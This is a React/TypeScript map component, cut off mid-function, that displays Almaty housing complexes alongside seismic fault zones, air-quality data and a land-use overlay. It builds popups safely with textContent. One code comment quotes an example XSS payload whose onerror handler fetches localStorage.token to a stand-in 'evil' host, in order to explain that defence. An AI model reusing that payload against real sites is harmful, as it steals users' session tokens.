"use client";

import { useEffect, useRef, useState, useMemo, useCallback } from "react";
import { useTranslation } from "react-i18next";
import maplibregl, { type FilterSpecification } from "maplibre-gl";
import "maplibre-gl/dist/maplibre-gl.css";
import { Activity, Construction, House, LandPlot, Wind, type LucideIcon } from "lucide-react";
import type { MapData } from "@/hooks/useComplexes";
import { formatPrice } from "@/lib/utils";
import { useTheme } from "@/components/theme-provider";
import { generateInterpolatedGrid } from "@/lib/airquality-interpolation";
import {
  completedYear,
  formatCompletion,
  isNewBuilding,
  isUnderConstruction,
  newBuildingSince,
  type Stage,
} from "@/lib/construction";

interface MapViewProps {
  data: MapData;
  onComplexClick?: (complexId: string) => void;
  hoveredComplexId?: string | null;
  selectedComplexId?: string | null;
  // ЖК the page's own search/filters leave in view (null = all). The
  // markers follow the sidebar list instead of always showing everything.
  visibleIds?: ReadonlySet<string> | null;
  // «Строящиеся» / «Новостройки» filters, controlled by a page that also
  // filters its list by them; without these the map keeps its own.
  stages?: Stage[];
  onStagesChange?: (stages: Stage[]) => void;
}

type CirclePaint = NonNullable<
  Extract<maplibregl.LayerSpecification, { type: "circle" }>["paint"]
>;

// ЖК marker ring: crimson for akimat-flagged (trumps everything), sky for
// «строится», white otherwise. The hover highlight wraps these instead of
// resetting to a flat white ring, which used to wipe both accents.
const COMPLEX_STROKE_WIDTH: CirclePaint["circle-stroke-width"] = [
  "case",
  ["==", ["get", "problematic"], 1], 3,
  ["==", ["get", "underConstruction"], 1], 3,
  2,
];
const COMPLEX_STROKE_COLOR: CirclePaint["circle-stroke-color"] = [
  "case",
  ["==", ["get", "problematic"], 1], "#7f1d1d", // dark crimson ring
  ["==", ["get", "underConstruction"], 1], "#0284c7", // sky-600 — строится
  "#fff",
];

// Map layers behind each key-feature toggle.
const SEISMIC_LAYERS = [
  "risk-zone-low", "risk-zone-moderate", "risk-zone-high",
  "faults-lines-1", "faults-lines-2", "faults-lines-3",
];
const AIR_LAYERS = ["air-heatmap", "air-stations-circles"];
const GENPLAN_LAYERS = ["genplan-detailed-img"];
const COMPLEX_LAYERS = ["complexes-circles", "complexes-labels"];

function setLayersVisible(map: maplibregl.Map, ids: string[], visible: boolean) {
  for (const id of ids) {
    if (map.getLayer(id)) map.setLayoutProperty(id, "visibility", visible ? "visible" : "none");
  }
}

/** One of the key features (seismic, air, new buildings, genplan): a
 *  large pill that is always on screen, filled with its colour when on. */
function FeatureToggle({
  active, onToggle, icon: Icon, label, title, count, activeClass, iconClass,
}: {
  active: boolean;
  onToggle: () => void;
  icon: LucideIcon;
  label: string;
  title: string;
  count?: number;
  activeClass: string;
  iconClass: string;
}) {
  return (
    <button
      type="button"
      onClick={onToggle}
      aria-pressed={active}
      title={title}
      className={`flex items-center gap-1.5 h-8 px-3 rounded-full border shadow-md text-xs font-semibold backdrop-blur transition-colors ${
        active
          ? `${activeClass} text-white border-transparent`
          : "bg-card/95 text-card-foreground border-border hover:bg-muted"
      }`}
    >
      <Icon className={`h-4 w-4 ${active ? "" : iconClass}`} />
      {label}
      {count != null && (
        <span
          className={`rounded-full px-1.5 text-[10px] font-medium ${
            active ? "bg-white/25" : "bg-muted text-muted-foreground"
          }`}
        >
          {count}
        </span>
      )}
    </button>
  );
}

/** Minimum live sensors before an interpolated PM2.5 surface is honest.
 *  The normal aggregator returns ~380; the emergency fallbacks return ~3. */
const MIN_STATIONS_FOR_HEATMAP = 10;

function getScoreColor(score: number | null): string {
  if (!score) return "#999";
  if (score >= 85) return "#22c55e";
  if (score >= 70) return "#eab308";
  return "#f97316";
}

function getSeismicColor(risk: string | null): string {
  if (!risk) return "#999";
  const colors: Record<string, string> = {
    critical: "#dc2626", high: "#f97316", moderate: "#eab308",
    low: "#84cc16", safe: "#22c55e",
  };
  return colors[risk] || "#999";
}

function getSeismicLabelKey(risk: string | null): string | null {
  const keys: Record<string, string> = {
    critical: "map.seismicOnFault",
    high: "map.seismicDanger",
    moderate: "map.seismicWatch",
    low: "map.seismicLow",
    safe: "map.seismicSafe",
  };
  return keys[risk || ""] || null;
}

/** Same idea for AirKaz level — map structured `level` to translation key
 *  so the station popup localises instead of showing the RU `levelLabel`. */
function getAirLabelKey(level: string | null | undefined): string | null {
  const keys: Record<string, string> = {
    good: "complex.airGood",
    moderate: "complex.airModerate",
    sensitive: "complex.airSensitive",
    unhealthy: "complex.airUnhealthy",
    very_unhealthy: "complex.airVeryUnhealthy",
    hazardous: "complex.airHazardous",
  };
  return keys[level || ""] || null;
}

function getFaultColor(danger: number): string {
  if (danger >= 3) return "#dc2626";
  if (danger >= 2) return "#f97316";
  return "#9ca3af";
}

/**
 * XSS-safe DOM builder for popup content. We can't use template-string +
 * setHTML here because complex `displayName` and air-station `name` are
 * derived from third-party data (Krisha listings, AirKaz API) — a malicious
 * listing with a name like `<img onerror="fetch('//evil/'+localStorage.token)">`
 * would otherwise execute on every map hover.
 *
 * `text:` always goes through textContent (auto-escapes). Use `html:` only
 * for known-safe static markup (no user data).
 */
function el(
  tag: string,
  opts: {
    css?: string;
    text?: string;
    html?: string;
    children?: (Node | null | false | undefined)[];
  } = {},
): HTMLElement {
  const node = document.createElement(tag);
  if (opts.css) node.style.cssText = opts.css;
  if (opts.text != null) node.textContent = opts.text;
  if (opts.html != null) node.innerHTML = opts.html;
  if (opts.children) {
    for (const c of opts.children) if (c) node.appendChild(c);
  }
  return node;
}

// MapTiler free key for 3D building tiles
const MAPTILER_KEY = "get_your_own_OpIi9ZULNHzrESv6T2vL";
const MAP_STYLE_LIGHT = "https://basemaps.cartocdn.com/gl/positron-gl-style/style.json";
const MAP_STYLE_DARK = "https://basemaps.cartocdn.com/gl/dark-matter-gl-style/style.json";

export default function MapView({
  data,
  onComplexClick,
  hoveredComplexId,
  selectedComplexId,
  visibleIds = null,
  stages: stagesProp,
  onStagesChange,
}: MapViewProps) {
  const { t, i18n } = useTranslation();
  const tRef = useRef(t);
  tRef.current = t;
  const langRef = useRef(i18n.language);
  langRef.current = i18n.language;
  const mapContainer = useRef<HTMLDivElement>(null);
  const mapRef = useRef<maplibregl.Map | null>(null);
  // Key-feature layers. Seismic (faults + risk zones together — zones
  // mean nothing without the faults) and air are on by default; the
  // detailed genplan (expert Тихон Шутов) is a heavy full-city raster, so
  // it waits for a click. ЖК markers are always coloured by seismic risk.
  const [showFaults, setShowFaults] = useState(true);
  const [showAirQuality, setShowAirQuality] = useState(true);
  const [showGenplanDetailed, setShowGenplanDetailed] = useState(false);
  // «Строящиеся» / «Новостройки» filter markers; layers above only show
  // or hide.
  const [ownStages, setOwnStages] = useState<Stage[]>([]);
  const stages = stagesProp ?? ownStages;
  const setStages = onStagesChange ?? setOwnStages;
  const toggleStage = (stage: Stage) =>
    setStages(stages.includes(stage) ? stages.filter((s) => s !== stage) : [...stages, stage]);
  // The load handler re-applies toggles and the marker filter, so a map
  // rebuilt by a theme or data change keeps what the user chose.
  const layersRef = useRef({ seismic: showFaults, air: showAirQuality, genplan: showGenplanDetailed });
  layersRef.current = { seismic: showFaults, air: showAirQuality, genplan: showGenplanDetailed };
  // View mode: false = вид сверху (pitch 0, default), true = объёмный.
  // Ref mirrors state for the non-reactive map handlers (init, flyTo).
  const [view3d, setView3d] = useState(false);
  const view3dRef = useRef(false);
  const { resolvedTheme } = useTheme();
  const isDark = resolvedTheme === "dark";

  const underConstructionCount = useMemo(
    () => data.complexes.filter(isUnderConstruction).length,
    [data.complexes],
  );
  const newBuildingCount = useMemo(
    () => data.complexes.filter((c) => isNewBuilding(c)).length,
    [data.complexes],
  );

  // Genplan button only when map-data carries the overlay (the backend
  // seeds it on start; /admin calibrates its corners).
  const hasGenplan = (data.overlays || []).some((o) => o.key === "genplan-detailed");

  const markerFilter = useMemo<FilterSpecification | null>(() => {
    const parts: FilterSpecification[] = [];
    if (visibleIds) parts.push(["in", ["get", "id"], ["literal", [...visibleIds]]]);
    if (stages.length > 0) {
      parts.push([
        "any",
        ...stages.map((s): FilterSpecification =>
          ["==", ["get", s === "building" ? "underConstruction" : "newBuilding"], 1]),
      ] as FilterSpecification);
    }
    if (parts.length === 0) return null;
    return parts.length === 1 ? parts[0] : (["all", ...parts] as FilterSpecification);
  }, [visibleIds, stages]);
  const markerFilterRef = useRef(markerFilter);
  markerFilterRef.current = markerFilter;

  const riskCounts = useMemo(() => {
    const counts: Record<string, number> = { critical: 0, high: 0, moderate: 0, low: 0, safe: 0 };
    data.complexes.forEach((c) => {
      const risk = c.seismicRiskLevel || "safe";
      counts[risk] = (counts[risk] || 0) + 1;
    });
    return counts;
  }, [data.complexes]);

  // Virtual grid of IDW-interpolated PM 2.5 points covering Almaty.
  // Recomputed only when station readings change. ~30-50ms for 60×60 grid.
  const airGrid = useMemo(() => {
    if (!data.airStations || data.airStations.length === 0) return [];
    // IDW over a handful of sensors is not a citywide picture — it just
    // smears one reading across whole districts. When the aggregator is
    // down we fall back to sources with only a few Almaty units, so below
    // this threshold we show the station markers alone and skip the
    // heatmap rather than imply knowledge we don't have.
    if (data.airStations.length < MIN_STATIONS_FOR_HEATMAP) return [];
    return generateInterpolatedGrid(
      data.airStations.map((s: any) => ({ lat: s.lat, lng: s.lng, pm25: s.pm25 })),
      60,  // cols
      60,  // rows
      8,   // top-K nearest neighbors
    );
  }, [data.airStations]);

  const onComplexClickRef = useRef(onComplexClick);
  onComplexClickRef.current = onComplexClick;

  useEffect(() => {
    if (!mapContainer.current || mapRef.current) return;

    const map = new maplibregl.Map({
      container: mapContainer.current,
      style: isDark ? MAP_STYLE_DARK : MAP_STYLE_LIGHT,
      center: [76.9286, 43.238],
      zoom: 12,
      // Default = чистый вид сверху (pitch 0, без наклона/искажений).
      // Объёмный «вид с птичьего полёта» включается кнопкой 2D/3D —
      // см. view3dRef + toggleView ниже.
      pitch: view3dRef.current ? 60 : 0,
      bearing: view3dRef.current ? -10 : 0,
    });

    map.addControl(new maplibregl.NavigationControl({ visualizePitch: true }), "top-right");
    mapRef.current = map;

    map.on("load", () => {
      // === ALMATY CITY BOUNDARY ===
      // Drawn first so everything else renders on top. Pure outline, no
      // fill — just shows the user where Almaty ends. Static OSM polygon
      // baked into the shared package.
      if (data.cityBoundary?.features?.length) {
        map.addSource("city-boundary", {
          type: "geojson",
          data: data.cityBoundary as any,
        });
        map.addLayer({
          id: "city-boundary-line",
          type: "line",
          source: "city-boundary",
          paint: {
            "line-color": isDark ? "#94a3b8" : "#475569",
            "line-width": [
              "interpolate", ["linear"], ["zoom"],
              9, 1.5,
              13, 2.5,
              16, 3,
            ],
            "line-opacity": 0.7,
            "line-dasharray": [4, 2],
          },
        });
      }

      // === ДЕТАЛЬНЫЙ ГЕНПЛАН (эксперт Тихон Шутов) ===
      // Full-city land-use plan assembled by the expert. WebP with alpha,
      // so transparent margins let the basemap show outside the city.
      // Own toggle in the layers panel; calibrated via /admin.
      {
        const cfg = (data.overlays || []).find((o) => o.key === "genplan-detailed");
        if (cfg) {
          map.addSource("genplan-detailed-img", {
            type: "image",
            url: cfg.imageUrl,
            coordinates: [
              [cfg.nwLon, cfg.nwLat],
              [cfg.neLon, cfg.neLat],
              [cfg.seLon, cfg.seLat],
              [cfg.swLon, cfg.swLat],
            ],
          });
          map.addLayer({
            id: "genplan-detailed-img",
            type: "raster",
            source: "genplan-detailed-img",
            layout: { visibility: "none" },
            paint: {
              "raster-opacity": cfg.opacity ?? 0.75,
              "raster-fade-duration": 200,
            },
          });
        }
      }

      // === FAULT RISK ZONES ===
      if (data.faultLines?.length > 0) {
        const allFaultFeatures = data.faultLines.map((f) => ({
          type: "Feature" as const,
          geometry: {
            type: "LineString" as const,
            coordinates: f.coordinates.map(([lat, lng]) => [lng, lat]),
          },
          properties: { name: f.name, label: f.label, danger: f.danger },
        }));

        map.addSource("faults-all", {
          type: "geojson",
          data: { type: "FeatureCollection", features: allFaultFeatures },
        });

        // Risk zone buffer layers
        const zones = [
          { id: "risk-zone-low", color: "#fef08a", opacity: 0.12, widths: [10, 4, 12, 16, 14, 60, 16, 200] },
          { id: "risk-zone-moderate", color: "#fed7aa", opacity: 0.18, widths: [10, 2, 12, 8, 14, 28, 16, 90] },
          { id: "risk-zone-high", color: "#fecaca", opacity: 0.25, widths: [10, 1, 12, 4, 14, 12, 16, 40] },
        ];

        for (const zone of zones) {
          map.addLayer({
            id: zone.id,
            type: "line",
            source: "faults-all",
            paint: {
              "line-color": zone.color,
              "line-width": ["interpolate", ["exponential", 2], ["zoom"], ...zone.widths],
              "line-opacity": zone.opacity,
            },
          });
        }

        // Actual fault lines
        for (const danger of [3, 2, 1]) {
          const faults = data.faultLines.filter((f) => f.danger === danger);
          if (faults.length === 0) continue;

          const features = faults.map((f) => ({
            type: "Feature" as const,
            geometry: {
              type: "LineString" as const,
              coordinates: f.coordinates.map(([lat, lng]) => [lng, lat]),
            },
            properties: { name: f.name, label: f.label, danger: f.danger },
          }));

          map.addSource(`faults-${danger}`, {
            type: "geojson",
            data: { type: "FeatureCollection", features },
          });

          map.addLayer({
            id: `faults-lines-${danger}`,
            type: "line",
            source: `faults-${danger}`,
            paint: {
              "line-color": getFaultColor(danger),
              "line-width": danger >= 3 ? 3 : 2,
              "line-opacity": 0.7,
              "line-dasharray": danger < 3 ? [2, 2] : [1],
            },
          });
        }

        // Fault click popup
        const faultPopup = new maplibregl.Popup({ closeButton: true, closeOnClick: true, maxWidth: "300px" });

        for (const danger of [3, 2, 1]) {
          const layerId = `faults-lines-${danger}`;
          map.on("mouseenter", layerId, () => { map.getCanvas().style.cursor = "crosshair"; });
          map.on("mouseleave", layerId, () => { map.getCanvas().style.cursor = ""; });

          map.on("click", layerId, (e) => {
            e.originalEvent.stopPropagation();
            const props = e.features?.[0]?.properties;
            if (!props) return;

            const dangerColor = props.danger >= 3 ? "#dc2626" : props.danger >= 2 ? "#f97316" : "#9ca3af";
            const dangerKey = props.danger >= 3 ? "map.faultConfirmed" : props.danger >= 2 ? "map.faultStudied" : "map.faultDisputed";

            const nearby = data.complexes
              .filter((c) => {
                const dist = Math.sqrt(Math.pow((c.lng - e.lngLat.lng) * 80, 2) + Math.pow((c.lat - e.lngLat.lat) * 111, 2));
                return dist < 1.5;
              })
              .sort((a, b) => (a.seismicDistanceMeters || 9999) - (b.seismicDistanceMeters || 9999))
              .slice(0, 5);

            const root = el("div", {
              css: "font-family:system-ui;padding:4px",
              children: [
                // Fault name — props.name is from our static FAULT_LINES JSON,
                // technically safe, but textContent is cheap insurance.
                el("div", {
                  css: "font-size:14px;font-weight:600;margin-bottom:4px",
                  text: String(props.name || ""),
                }),
                el("div", {
                  css: "font-size:12px",
                  children: [
                    el("span", {
                      css: `color:${dangerColor};font-weight:bold`,
                      text: tRef.current(dangerKey),
                    }),
                  ],
                }),
                nearby.length > 0
                  ? el("div", {
                      css: "margin-top:8px;border-top:1px solid #eee;padding-top:6px",
                      children: [
                        el("p", {
                          css: "font-size:11px;color:#666;margin-bottom:4px",
                          text: tRef.current("map.nearbyComplexes"),
                        }),
                        ...nearby.map((c) => {
                          const dist = c.seismicDistanceMeters
                            ? c.seismicDistanceMeters < 1000
                              ? `${c.seismicDistanceMeters} м`
                              : `${(c.seismicDistanceMeters / 1000).toFixed(1)} км`
                            : "—";
                          return el("div", {
                            css: "display:flex;align-items:center;gap:6px;margin-bottom:2px;font-size:12px",
                            children: [
                              el("span", {
                                css: `width:8px;height:8px;border-radius:50%;background:${getSeismicColor(c.seismicRiskLevel)};flex-shrink:0`,
                              }),
                              // c.displayName comes from Krisha — XSS vector. textContent escapes it.
                              el("span", { css: "flex:1", text: String(c.displayName || "") }),
                              el("span", { css: "color:#888", text: dist }),
                            ],
                          });
                        }),
                      ],
                    })
                  : null,
              ],
            });

            faultPopup.setLngLat(e.lngLat).setDOMContent(root).addTo(map);
          });
        }
      }

      // === AIR QUALITY (PM 2.5) — IDW-INTERPOLATED FIELD + STATION MARKERS ===
      if (data.airStations && data.airStations.length > 0) {
        // 1) IDW-interpolated grid (covers Almaty uniformly, no gaps).
        //    Each grid cell is a virtual point colored by interpolated PM 2.5.
        //    Rendered as blurred circles so adjacent cells blend smoothly.
        const gridFeatures = airGrid.map((g) => ({
          type: "Feature" as const,
          geometry: { type: "Point" as const, coordinates: [g.lng, g.lat] },
          properties: { pm25: g.pm25, color: g.color },
        }));

        map.addSource("air-grid", {
          type: "geojson",
          data: { type: "FeatureCollection", features: gridFeatures },
        });

        // Heatmap-like field via blurred circles.
        // - radius scales with zoom so adjacent grid points overlap
        // - circle-blur > 1 produces smooth gradient between cells
        // - opacity is moderate so basemap stays readable
        map.addLayer({
          id: "air-heatmap",
          type: "circle",
          source: "air-grid",
          // Default visible — matches showAirQuality state default (true).
          // Toggling is handled by the showAirQuality useEffect below.
          paint: {
            "circle-radius": [
              "interpolate", ["linear"], ["zoom"],
              9, 22,
              11, 28,
              13, 38,
              15, 60,
              17, 90,
            ],
            "circle-color": ["get", "color"],
            "circle-blur": 1.6,
            "circle-opacity": [
              "interpolate", ["linear"], ["zoom"],
              9, 0.55,
              13, 0.5,
              16, 0.4,
            ],
          },
        });

        // 2) Real station markers — interactive layer with popup.
        const stationFeatures = data.airStations.map((s: any) => ({
          type: "Feature" as const,
          geometry: { type: "Point" as const, coordinates: [s.lng, s.lat] },
          properties: {
            id: s.id,
            name: s.name,
            pm25: s.pm25,
            origin: s.origin || "",
            district: s.district || "",
            level: s.level,
            levelLabel: s.levelLabel,
            color: s.color,
            updatedAt: s.updatedAt,
          },
        }));

        map.addSource("air-stations", {
          type: "geojson",
          data: { type: "FeatureCollection", features: stationFeatures },
        });

        // Station marker dots — only at higher zoom (otherwise too cluttered)
        map.addLayer({
          id: "air-stations-circles",
          type: "circle",
          source: "air-stations",
          minzoom: 9,
          // Stations render as a "donut" — white fill, thick colored ring —
          // so they read distinctly from the solid ЖК circles. The color
          // still encodes PM2.5 level via the ring; the white center is the
          // visual cue that says "sensor / measurement" instead of "place".
          paint: {
            "circle-radius": [
              "interpolate", ["linear"], ["zoom"],
              12, 4, 14, 6, 17, 10,
            ],
            "circle-color": "#ffffff",
            "circle-opacity": [
              "interpolate", ["linear"], ["zoom"],
              12, 0.95, 14, 1, 17, 1,
            ],
            "circle-stroke-width": [
              "interpolate", ["linear"], ["zoom"],
              12, 2, 14, 3, 17, 4,
            ],
            "circle-stroke-color": ["get", "color"],
          },
        });

        // Station hover popup
        const stationPopup = new maplibregl.Popup({
          closeButton: false,
          closeOnClick: false,
          maxWidth: "240px",
        });
        map.on("mouseenter", "air-stations-circles", (e) => {
          map.getCanvas().style.cursor = "help";
          const f = e.features?.[0];
          if (!f) return;
          const p = f.properties;
          const coords = (f.geometry as any).coordinates.slice();
          const dateLocale = langRef.current?.startsWith("kk") ? "kk-KZ" : "ru-RU";
          const date = p.updatedAt ? new Date(p.updatedAt).toLocaleString(dateLocale, {
            day: "2-digit", month: "2-digit", hour: "2-digit", minute: "2-digit",
          }) : "";
          // Color is read from our backend's airKaz.classifyPm25 — bounded to a
          // known palette, but we still pass it through CSS-only context. Name,
          // origin, district come straight from upstream JSON: untrusted, so
          // textContent everywhere.
          const safeColor = String(p.color || "#666");
          const popupRoot = el("div", {
            css: "font-family:system-ui;padding:4px;font-size:12px",
            children: [
              el("div", {
                css: "display:flex;align-items:center;gap:6px;margin-bottom:4px",
                children: [
                  el("span", { css: `width:10px;height:10px;border-radius:50%;background:${safeColor}` }),
                  el("strong", { text: String(p.name || "") }),
                ],
              }),
              el("div", {
                css: `font-size:18px;font-weight:700;color:${safeColor}`,
                children: [
                  document.createTextNode(`${p.pm25} `),
                  el("span", {
                    css: "font-size:11px;font-weight:400;color:#666",
                    text: "µg/m³",
                  }),
                ],
              }),
              el("div", {
                css: `color:${safeColor};font-size:11px;font-weight:500`,
                text: (() => {
                  const key = getAirLabelKey(p.level);
                  return key ? tRef.current(key) : String(p.levelLabel || "");
                })(),
              }),
              p.origin
                ? el("div", {
                    css: "color:#888;font-size:10px;margin-top:4px",
                    text:
                      tRef.current("map.popupSource", { name: String(p.origin) }) +
                      (p.district ? " · " + String(p.district) : ""),
                  })
                : null,
              date ? el("div", { css: "color:#aaa;font-size:10px", text: date }) : null,
            ],
          });
          stationPopup.setLngLat(coords).setDOMContent(popupRoot).addTo(map);
        });
        map.on("mouseleave", "air-stations-circles", () => {
          map.getCanvas().style.cursor = "";
          stationPopup.remove();
        });
      }

      // === COMPLEX MARKERS ===
      const complexFeatures = data.complexes.map((c) => ({
        type: "Feature" as const,
        geometry: { type: "Point" as const, coordinates: [c.lng, c.lat] },
        properties: {
          id: c.id,
          name: c.displayName,
          score: c.scoreTotal,
          priceMin: c.priceMin,
          priceMax: c.priceMax,
          listings: c.listingsCount,
          commute: c.commuteMinutes,
          seismic: c.seismicRiskLevel,
          seismicDist: c.seismicDistanceMeters,
          district: c.district,
          scoreColor: getScoreColor(c.scoreTotal),
          seismicColor: getSeismicColor(c.seismicRiskLevel),
          // Akimat-flagged: drives the red ring + crimson fill on the
          // marker. Even when the ЖК scores well on seismic / commute we
          // override the colour — the "не покупайте" signal trumps
          // everything else on the map.
          problematic: c.isProblematic ? 1 : 0,
          // Krisha «строящийся дом» — sky ring + popup line. Year/quarter
          // travel raw so the popup formats them in the current language.
          underConstruction: isUnderConstruction(c) ? 1 : 0,
          // Finished within the last years — «Новостройки» filter + popup.
          newBuilding: isNewBuilding(c) ? 1 : 0,
          builtYear: completedYear(c) || 0,
          completionYear: c.completionYear || 0,
          completionQuarter: c.completionQuarter || 0,
          // Latest-comment breadcrumb. MapLibre flattens feature props to
          // primitives, so pass the fields separately (not a nested obj).
          lastCommentText: c.lastComment?.text || "",
          lastCommentAuthor: c.lastComment?.author || "",
          commentCount: c.lastComment?.count || 0,
        },
      }));

      map.addSource("complexes", {
        type: "geojson",
        data: { type: "FeatureCollection", features: complexFeatures },
      });

      map.addLayer({
        id: "complexes-circles",
        type: "circle",
        source: "complexes",
        paint: {
          // Stubs may have listingsCount=0; bump the floor radius up so
          // they're still tappable on mobile.
          "circle-radius": [
            "case",
            ["==", ["get", "problematic"], 1],
            ["interpolate", ["linear"], ["get", "listings"], 0, 11, 1, 11, 5, 13, 10, 16, 20, 20],
            ["interpolate", ["linear"], ["get", "listings"], 1, 8, 5, 12, 10, 16, 20, 20],
          ],
          "circle-color": [
            "case",
            ["==", ["get", "problematic"], 1], "#dc2626", // crimson — акимат пометил
            ["get", "seismicColor"],
          ],
          "circle-opacity": 0.85,
          "circle-stroke-width": COMPLEX_STROKE_WIDTH,
          "circle-stroke-color": COMPLEX_STROKE_COLOR,
        },
      });

      map.addLayer({
        id: "complexes-labels",
        type: "symbol",
        source: "complexes",
        layout: {
          "text-field": ["get", "name"],
          "text-size": 11,
          "text-offset": [0, 1.8],
          "text-anchor": "top",
          "text-max-width": 10,
        },
        paint: {
          "text-color": "#374151",
          "text-halo-color": "#fff",
          "text-halo-width": 1.5,
        },
      });

      // Hover popup
      const popup = new maplibregl.Popup({ closeButton: false, closeOnClick: false, maxWidth: "280px" });

      map.on("mouseenter", "complexes-circles", (e) => {
        map.getCanvas().style.cursor = "pointer";
        const feature = e.features?.[0];
        if (!feature) return;
        const props = feature.properties;
        const coords = (feature.geometry as any).coordinates.slice();

        const seismicDist = props.seismicDist;
        const seismicDistStr = seismicDist ? (seismicDist < 1000 ? `${seismicDist} м` : `${(seismicDist / 1000).toFixed(1)} км`) : "";
        const seismicRisk = props.seismic || "safe";
        const seismicBg = (seismicRisk === "critical" || seismicRisk === "high") ? "#fef2f2" : seismicRisk === "moderate" ? "#fffbeb" : "#f0fdf4";
        const seismicLabelKey = getSeismicLabelKey(seismicRisk);
        const seismicLabel = seismicLabelKey ? tRef.current(seismicLabelKey) : "";

        // props.name is the complex displayName, parsed from Krisha listing
        // pages — fully attacker-controlled. This is THE main XSS vector for
        // the public site, so build the popup as DOM nodes only.
        const safeScoreColor = String(props.scoreColor || "#666");
        const popupRoot = el("div", {
          css: "font-family:system-ui;padding:4px",
          children: [
            el("div", {
              css: "display:flex;align-items:center;gap:8px;margin-bottom:4px",
              children: [
                el("strong", { css: "font-size:14px", text: String(props.name || "") }),
                props.score
                  ? el("span", {
                      css: `background:${safeScoreColor};color:white;padding:2px 8px;border-radius:12px;font-weight:bold;font-size:12px`,
                      text: `${Math.round(props.score)}%`,
                    })
                  : null,
              ],
            }),
            props.priceMin && props.priceMax
              ? el("div", {
                  css: "font-weight:600;margin-top:4px",
                  text: `${formatPrice(props.priceMin)} — ${formatPrice(props.priceMax)}`,
                })
              : null,
            el("div", {
              css: "display:flex;gap:12px;margin-top:4px;color:#666;font-size:12px",
              children: [
                el("span", {
                  text: `🏠 ${tRef.current("map.popupListings", { count: props.listings })}`,
                }),
                // Commute deliberately hidden from the hover popup. The map
                // shows complexes deduplicated globally, so the commute
                // value comes from whichever project copy "won" — not from
                // the viewer's actual destination. Misleading to show. The
                // slide-over surfaces it only for authenticated users where
                // it actually maps to their interview answers.
              ],
            }),
            props.underConstruction
              ? el("div", {
                  css: "display:flex;align-items:center;gap:6px;margin-top:6px;padding:4px 6px;border-radius:6px;font-size:11px;font-weight:600;background:#f0f9ff;color:#075985;border:1px solid #bae6fd",
                  children: [
                    el("span", { text: "🏗" }),
                    el("span", {
                      text: (() => {
                        const label = tRef.current("map.popupUnderConstruction");
                        const date = formatCompletion(
                          {
                            completionYear: Number(props.completionYear) || null,
                            completionQuarter: Number(props.completionQuarter) || null,
                          },
                          tRef.current,
                        );
                        return date
                          ? `${label} · ${tRef.current("map.popupCompletion", { date })}`
                          : label;
                      })(),
                    }),
                  ],
                })
              : null,
            props.newBuilding
              ? el("div", {
                  css: "display:flex;align-items:center;gap:6px;margin-top:6px;padding:4px 6px;border-radius:6px;font-size:11px;font-weight:600;background:#f5f3ff;color:#5b21b6;border:1px solid #ddd6fe",
                  children: [
                    el("span", { text: "🏠" }),
                    el("span", {
                      text: tRef.current("map.popupNewBuilding", { year: Number(props.builtYear) }),
                    }),
                  ],
                })
              : null,
            seismicDist
              ? el("div", {
                  css: `display:flex;align-items:center;gap:6px;margin-top:6px;padding:4px 6px;border-radius:6px;font-size:11px;background:${seismicBg}`,
                  children: [
                    el("span", {
                      css: `width:8px;height:8px;border-radius:50%;background:${getSeismicColor(seismicRisk)};flex-shrink:0`,
                    }),
                    el("span", { text: seismicLabel }),
                    el("span", {
                      css: "color:#888;margin-left:auto",
                      text: `${seismicDistStr} ${tRef.current("map.toFault")}`,
                    }),
                  ],
                })
              : null,
            // Pinned at the bottom so it visually anchors the popup and is
            // the last thing the eye lands on before the user clicks. All
            // text comes from i18n — no attacker-controlled fields here.
            props.problematic
              ? el("div", {
                  css: "display:flex;align-items:center;gap:6px;margin-top:6px;padding:6px 8px;border-radius:6px;font-size:11px;font-weight:600;background:#fef2f2;color:#7f1d1d;border:1px solid #fecaca",
                  children: [
                    el("span", { css: "font-size:13px", text: "⚠️" }),
                    el("span", { text: tRef.current("map.problematicBadge") }),
                  ],
                })
              : null,
            // Comment breadcrumb — surfaces the discussion (or nudges to
            // start one) so the comment feature gets noticed. lastComment*
            // fields are user-generated → rendered via textContent (el's
            // `text:`), never innerHTML, so no XSS.
            String(props.lastCommentText || "").length > 0
              ? el("div", {
                  css: "margin-top:6px;padding:6px 8px;border-radius:6px;font-size:11px;background:#eff6ff;color:#1e3a8a;border:1px solid #bfdbfe",
                  children: [
                    el("div", {
                      css: "font-weight:600;display:flex;align-items:center;gap:5px;margin-bottom:2px",
                      children: [
                        el("span", { text: "💬" }),
                        el("span", {
                          text:
                            Number(props.commentCount) > 1
                              ? tRef.current("map.commentsCount", { count: Number(props.commentCount) })
                              : String(props.lastCommentAuthor || ""),
                        }),
                      ],
                    }),
                    el("div", {
                      css: "color:#1e40af;font-style:italic;line-height:1.3",
                      text: `«${String(props.lastCommentText)}»`,
                    }),
                  ],
                })
              : el("div", {
                  css: "margin-top:6px;padding:6px 8px;border-radius:6px;font-size:11px;font-weight:500;background:#f1f5f9;color:#475569;border:1px dashed #cbd5e1;display:flex;align-items:center;gap:6px",
                  children: [
                    el("span", { text: "💬" }),
                    el("span", { text: tRef.current("map.commentNudge") }),
                  ],
                }),
          ],
        });
        popup.setLngLat(coords).setDOMContent(popupRoot).addTo(map);
      });

      map.on("mouseleave", "complexes-circles", () => {
        map.getCanvas().style.cursor = "";
        popup.remove();
      });

      map.on("click", "complexes-circles", (e) => {
        e.originalEvent.stopPropagation();
        const id = e.features?.[0]?.properties?.id;
        if (id && onComplexClickRef.current) onComplexClickRef.current(id);
      });

      const layers = layersRef.current;
      setLayersVisible(map, SEISMIC_LAYERS, layers.seismic);
      setLayersVisible(map, AIR_LAYERS, layers.air);
      setLayersVisible(map, GENPLAN_LAYERS, layers.genplan);
      for (const id of COMPLEX_LAYERS) map.setFilter(id, markerFilterRef.current);

      // Fit bounds
      if (complexFeatures.length > 0) {
        const bounds = new maplibregl.LngLatBounds();
        complexFeatures.forEach((f) => bounds.extend(f.geometry.coordinates as [number, number]));
        map.fitBounds(bounds, { padding: 80, maxZoom: 14, pitch: view3dRef.current ? 45 : 0 });
      }
    });

    return () => { map.remove(); mapRef.current = null; };
  }, [data, isDark, airGrid]);

  // Fly to selected complex
  useEffect(() => {
    const map = mapRef.current;
    if (!map || !selectedComplexId) return;
    const complex = data.complexes.find((c) => c.id === selectedComplexId);
    if (complex) {
      map.flyTo({ center: [complex.lng, complex.lat], zoom: 15, pitch: view3dRef.current ? 50 : 0, duration: 1500 });
    }
  }, [selectedComplexId, data.complexes]);

  // Highlight hovered complex
  useEffect(() => {
    const map = mapRef.current;
    if (!map || !map.isStyleLoaded() || !map.getLayer("complexes-circles")) return;

    if (hoveredComplexId) {
